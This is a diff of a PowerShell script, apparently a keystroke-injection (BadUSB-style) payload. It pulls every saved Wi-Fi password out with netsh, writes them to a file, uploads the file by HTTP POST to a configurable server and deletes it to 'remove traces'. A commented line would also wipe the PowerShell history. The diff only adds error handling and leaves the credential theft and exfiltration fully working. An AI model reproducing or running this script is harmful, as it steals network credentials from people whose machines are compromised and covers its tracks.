@@ -3,12 +3,7 @@ $PASSFILE = "wifi_pass.txt"
 $APIKEY = 69420
 $SERVERSITE = "http://127.0.0.1:5001/upload"
 
-# Open Command Prompt
-Start-Sleep -Milliseconds 700
-Start-Process cmd.exe
-
 # Open Powershell
-Start-Sleep -Milliseconds 1800
 cd "$HOME\Desktop"
 
 # Disable capslock
@@ -19,7 +14,11 @@ if ([console]::CapsLock -eq $true) {
 
 # Add all network profiles
 $Profiles = @()
-$Profiles += (netsh wlan show profiles | Select-String "\:(.+)$").Matches | ForEach-Object { $_.Groups[1].Value.Trim() }
+$Profiles += (netsh wlan show profiles | Select-String "\:(.+)$").Matches | ForEach-Object { 
+    if ($_.Groups[1]) {
+        $_.Groups[1].Value.Trim()
+    }
+}
 
 # Result string
 $Res = $Profiles | ForEach-Object {
@@ -39,6 +38,10 @@ $Res = $Profiles | ForEach-Object {
 $Res | Format-Table -AutoSize | Out-File -FilePath .\$PASSFILE -Encoding ASCII -Width 50
 
 # Send file to server
+# Check if file exists
+if (Test-Path $PASSFILE) {
+    Write-Host "File exists: $PASSFILE"
+
 $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString()
 
 $body = @"
@@ -50,14 +53,16 @@ $(Get-Content -Path $PASSFILE -Raw)
 --$boundary--
 "@
 
-try {
-    Invoke-WebRequest -Uri $SERVERSITE -Method Post -Headers @{"X-API-Key" = $APIKEY} -Body $body -ContentType "multipart/form-data; boundary=$boundary"
-} catch {
-    Write-Host "File upload failed: $($_.Exception.Message)"
+    try {
+        Invoke-WebRequest -Uri $SERVERSITE -Method Post -Headers @{"X-API-Key" = $APIKEY} -Body $body -ContentType "multipart/form-data; boundary=$boundary"
+    } catch {
+        Write-Host "File upload failed: $($_.Exception.Message)"
+    }
+} else {
+    Write-Host "The file does not exist: $PASSFILE"
 }
 
 # Remove traces
-Start-Sleep -Milliseconds 4500
 Remove-Item -Path .\$PASSFILE -Force
 # Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -Force
 
